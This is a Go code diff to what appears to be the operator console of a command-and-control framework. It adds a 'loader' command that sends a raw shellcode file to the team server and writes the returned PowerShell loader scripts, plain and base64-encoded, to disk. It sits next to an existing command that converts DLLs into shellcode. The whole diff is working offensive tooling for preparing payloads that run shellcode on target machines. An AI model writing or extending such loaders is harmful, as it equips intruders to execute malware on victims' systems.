@@ -458,6 +458,69 @@ func ParseRawTextCmd(rawString string) []string {
 	return args
 }
 
+func PrepareLoader(c *ishell.Context) bool {
+	c.Printf("<shellcodePath>: ")
+	args := c.ReadLine()
+	argz := ParseRawTextCmd(args)
+	if len(args) < 1 {
+		return false
+	}
+	path := argz[0]
+	raw, err := ioutil.ReadFile(path)
+	if err != nil {
+		c.Printf(err.Error())
+		return false
+	}
+	// POST BYTES
+	payload := data.LoaderPayload{
+		RawShellcodeBytes: raw,
+		LoaderType:        "powershell",
+	}
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	endpoint := fmt.Sprintf("https://%s:%s/v1/loaders", ServerHostName, ServerRestPort)
+	body, err := DoPostRequest(endpoint, jsonData)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	convertedPayload := data.LoaderPayload{}
+	err = json.Unmarshal(body, &convertedPayload)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+
+	//c.Printf("%+v\n", convertedPayload)
+	file, err := ioutil.TempFile(".", "*.loader.ps1")
+	defer file.Close()
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	wrote, err := file.Write([]byte(convertedPayload.LoaderString))
+	if err != nil {
+		c.Printf("%s%s", err.Error())
+		return false
+	}
+	file2, err := ioutil.TempFile(".", "*.loaderb64.ps1")
+	defer file2.Close()
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	wrote2, err := file2.Write([]byte(convertedPayload.LoaderStringB64))
+	if err != nil {
+		c.Printf("%s%s", err.Error())
+		return false
+	}
+	c.Printf("Wrote payload to disk %s %d bytes\nWrote payload to disk %s %d bytes\n", file.Name(), wrote, file2.Name(), wrote2)
+	return true
+}
+
 func PrepareSRDI(c *ishell.Context) bool {
 	c.Printf("<dllPath> <functionToCall>: ")
 	args := c.ReadLine()
@@ -965,6 +1028,14 @@ func OperatorMainLoop() {
 			c.Println("Example ->  /tmp/test.dll boom")
 			c.Println("Example ->  C:\\Temp\\BadDLL.dll boom")
 			PrepareSRDI(c)
+		},
+	})
+	shell.AddCmd(&ishell.Cmd{
+		Name: "loader",
+		Help: "generate loaders",
+		Func: func(c *ishell.Context) {
+			c.Println("Example ->  C:\\Temp\\shellcode.bin")
+			PrepareLoader(c)
 		},
 	})
 	shell.AddCmd(&ishell.Cmd{
